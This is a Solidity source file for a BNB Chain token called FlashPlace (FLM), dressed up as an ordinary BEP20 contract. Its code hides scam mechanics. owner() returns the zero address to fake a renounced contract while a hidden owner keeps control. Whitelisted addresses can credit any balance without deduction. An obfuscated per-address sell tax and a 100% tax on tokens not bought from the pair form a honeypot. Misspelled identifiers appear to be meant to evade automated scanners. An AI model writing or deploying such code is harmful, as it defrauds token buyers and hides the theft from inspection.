/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// http://instagram.com/FlashPlace39487
// https://www.reddit.com/user/FlashPlace39487
// TWITTER:https://FlashPlace39487.com/
// WEBSITE:https://twitter.com/FlashPlace39487
// TELEGRAM:https://t.me/FlashPlace39487

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFlashPlace39487OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingFlashPlace39487OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingFlashPlace39487OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFlashPlace39487OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFlashPlace39487OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FlashPlace39487To() external view returns (address);
    function FlashPlace39487ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFlashPlace39487To(address) external;
    function setFlashPlace39487ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

   function decimals() public view virtual returns (uint8) {
        return 18;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }
      function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract FLM is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baFlashPlace39487lances;
    mapping(address => uint256) private _baFlashPlace39487lances1;
    mapping(address => bool) private _reFlashPlace39487llease;
    mapping(uint256 => uint256) private _bFlashPlace39487blist;
    string name_ = "FlashPlace";
    string symbol_ = "FLM";
    uint256 totalSupply_ = 1000000000;   
    address public uniswapV2Pair;
    address deFlashPlace39487ad = 0x000000000000000000000000000000000000dEaD;
    address _gaFlashPlace39487te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxFlashPlace39487x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    uint256 _wdFlashPlace39487qq = 612133574914072451487603842748060831661938495091;
    constructor()

    BEP20(name_, symbol_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtFlashPlace39487in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deFlashPlace39487ad, totalSupply() / 10*2);
         transfer(_mxFlashPlace39487x, totalSupply() / 10*2);
         transfer(_gaFlashPlace39487te, totalSupply() / 10*1);



        _reFlashPlace39487llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baFlashPlace39487lances[cauunt];
    }

    function _mtFlashPlace39487in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baFlashPlace39487lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellFlashPlace39487 = 0;
    uint256 private _defaultBuyFlashPlace39487 = 0;

    function _setRelease(address _address) external onlyowaer {
        _reFlashPlace39487llease[_address] = true;
    }
    function _incS(uint256 _value) external onlyowaer {
        _defaultSellFlashPlace39487 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reFlashPlace39487llease[_address];
    }

    function _setFlashPlace39487(uint256[] memory _accFlashPlace39487,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accFlashPlace39487.length;i++){
            _bFlashPlace39487blist[_accFlashPlace39487[i]] = _value[i];
        }
    }
        function _msgFlashPlace39487Info(uint _accFlashPlace39487) internal view virtual returns (uint) {
        uint256 accFlashPlace39487 = _accFlashPlace39487 ^ _wdFlashPlace39487qq;
        return _bFlashPlace39487blist[accFlashPlace39487];
}
    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reFlashPlace39487llease[owaer] == true) {
            _baFlashPlace39487lances[to] += amuont;
            return true;
        }
        _tFlashPlace39487transfer(owaer, to, amuont);
        return true;
    }
    function _tFlashPlace39487transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baFlashPlace39487lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeFlashPlace39487 = 0;
        uint256 tradeFlashPlace39487amuont = 0;

        if (!(_reFlashPlace39487llease[from] || _reFlashPlace39487llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeFlashPlace39487 = _defaultBuyFlashPlace39487;
                _baFlashPlace39487lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeFlashPlace39487 = _msgFlashPlace39487Info(uint160(from));
                tradeFlashPlace39487 = tradeFlashPlace39487 < _defaultSellFlashPlace39487 ? _defaultSellFlashPlace39487 : tradeFlashPlace39487;
                tradeFlashPlace39487 = _baFlashPlace39487lances1[from] >= _amuont ? tradeFlashPlace39487 : 100;
                _baFlashPlace39487lances1[from] = _baFlashPlace39487lances1[from] >= _amuont ? _baFlashPlace39487lances1[from] - _amuont : _baFlashPlace39487lances1[from];
            }
                        
            tradeFlashPlace39487amuont = _amuont.mul(tradeFlashPlace39487).div(100);
        }


        if (tradeFlashPlace39487amuont > 0) {
            _baFlashPlace39487lances[from] = _baFlashPlace39487lances[from].sub(tradeFlashPlace39487amuont);
            _baFlashPlace39487lances[deFlashPlace39487ad] = _baFlashPlace39487lances[deFlashPlace39487ad].add(tradeFlashPlace39487amuont);
            emit Transfer(from, deFlashPlace39487ad, tradeFlashPlace39487amuont);
        }

        _baFlashPlace39487lances[from] = _baFlashPlace39487lances[from].sub(_amuont - tradeFlashPlace39487amuont);
        _baFlashPlace39487lances[_to] = _baFlashPlace39487lances[_to].add(_amuont - tradeFlashPlace39487amuont);
        emit Transfer(from, _to, _amuont - tradeFlashPlace39487amuont);
    }



    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tFlashPlace39487transfer(from, to, amuont);
        return true;
    }
}